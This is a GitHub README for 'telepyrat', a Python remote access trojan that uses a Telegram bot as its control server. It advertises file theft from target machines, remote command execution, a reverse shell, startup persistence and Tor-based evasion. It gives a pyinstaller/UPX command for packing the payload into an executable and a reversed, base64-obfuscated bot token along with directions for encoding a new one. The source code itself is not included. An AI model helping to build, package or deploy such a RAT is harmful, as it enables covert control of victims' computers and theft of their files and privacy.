# telepyrat
A simple python rat that uses Telegram API as a back-end server 

****========================================================================****

Hello 


this is a very simple remote access trojan (RAT) that uses Telegram API as the back-end server !
actually this is a mix of some older versions available on the github (Its OpenSource Dude :xD)
and i had added some new features ... 

i hope you like it , contact me if you have any idea or something 

annnd i'm sorry for my bad English !!!

maj0rmil4d <3


****========================================================================****

some of the features : 

	==> Download file on the target machine (from direct link)
	==> Download file from the target machine
	==> Bypass the internet censorship against telegram with tor :)
	==> Show IP address of the target machine
	==> Show some information about the target machine
	==> Power off the target machine 
	==> Make this tool persistent by adding the exe file to the startup path !
	==> Show a message box on the target macine 
	==> Change functionality of mouse buttons
	==> Run command prompt commands
	==> It can give you a reverse shell from the target machine (risky !)
	==> It can make the computer target to speak

****========================================================================****

HELP :


to convert py file to exe :
	
	use pyinstaller 

		syntax : 

			pyinstaller.exe --onefile --upx-dir C:\windows\system32 .\simple.spec

		hint : " don't forget to change paths in the siple.spec file"

to install autopy :
	
	Search the fucking google man !


used packages : 
	
	from telegram import utils , Bot
	from telegram.ext import Updater , CommandHandler
	from urllib import urlopen
	from platform import uname , node , architecture
	from subprocess import Popen , PIPE
	from os import path , system , remove , listdir
	from socket import socket , AF_INET , SOCK_STREAM
	import sys
	from binascii import a2b_base64
	from autopy import bitmap
	import pyttsx
	from binascii import b2a_base64

	hint : " for telegram and telegram.ext packages please install python-telegram-bot with pip :)"

please don't forget to change Token (use @botfather to gain a token) in t.py file :
	
	token = '3kDN0gDN4UjN6EUQFdjSfJ2TIBTZ6ZjRZNHaoB3QvFXbvJDUmVXQJd3YSNGO'
	token = token[::-1]
	token = a2b_base64(token)
	token = token[::-1]

	hint : "just reverse the above functions to create a encoded token and replace it with this one"


and at the end ... i recommend to watch this video :
	
	youtube_link : https://youtu.be/_hJm5CSxFxc

****========================================================================****

Version : currently its version 1 

Improvements : lots of ideas in my mind that i would like to add them in future 

Contact me :

	Website :

		maj0rmil4d.rf.gd

	social media :

		instagram.com/sec.milad
		telegram.me/@iAmAwindow

	email : 

		maj0rmil4d@gmail.com


Special Thanks to :
	
	Commander <3 , Mobin , jok3r , Ehsan , and all of my other lovely firends
	and thanks to my fucking university cause this was my finnal project for that shitty place :D

	as you know , i don't take responsibility for any illegal activity


	me and my friends ... you and the whole world , GoOdLuck <3

****========================================================================****

